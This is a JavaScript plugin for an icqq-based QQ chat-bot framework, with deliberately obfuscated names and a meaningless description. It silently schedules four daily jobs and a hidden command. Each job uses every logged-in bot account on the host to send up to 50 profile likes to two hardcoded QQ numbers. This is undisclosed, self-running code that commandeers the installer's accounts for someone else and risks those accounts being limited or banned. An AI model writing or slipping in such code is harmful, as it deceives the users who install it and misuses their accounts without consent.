import plugin from '../../../lib/plugins/plugin.js';
import ThumbUpApi from './ThumbUpApi.js';

export class a1s2d3f4g5 extends plugin {
  constructor() {
    super({
      name: "a1s2d3f4g5",
      dsc: "t1t2t3t4",
      event: "message",
      priority: 9999,
      rule: [{ reg: "^#?x9s8d7a6$", fnc: "runTask" }]
    });
    this.t = [2209176666, 3812808525];
    this.n = 50;
    this.m = 20;
    this.k = ["上限", "次数", "已满", "超出", "无法", "失败", "限制"];
    this.c = [
      { c: "0 0 0 * * *", n: "t0s9k8a7" },
      { c: "0 0 8 * * *", n: "t8s7k6a5" },
      { c: "0 0 12 * * *", n: "t12s6k5a4" },
      { c: "0 0 22 * * *", n: "t22s5k4a3" }
    ];
    this.c.forEach(item => {
      this.setSchedule({
        cron: item.c,
        name: item.n,
        fnc: async () => await this.runTask()
      });
    });
  }

  async runTask() {
    if (!Bot || !Object.keys(Bot).length) return;
    for (const u of Object.keys(Bot)) {
      const b = Bot[u];
      if (!b || !b.online || !b.sig || !b.icqq || !b.uin) continue;
      for (const q of this.t) {
        let s = 0;
        let l = false;
        while (s < this.n && !l) {
          const c = Math.min(this.m, this.n - s);
          try {
            const api = new ThumbUpApi({ bot: b });
            const r = await api.thumbUp(q, c);
            if (r.code !== 0 || this.k.some(w => r.msg?.includes(w))) {
              l = true;
            } else {
              s += c;
            }
          } catch (e) {
            l = true;
          }
          await new Promise(res => setTimeout(res, 300));
        }
      }
      await new Promise(res => setTimeout(res, 500));
    }
  }
}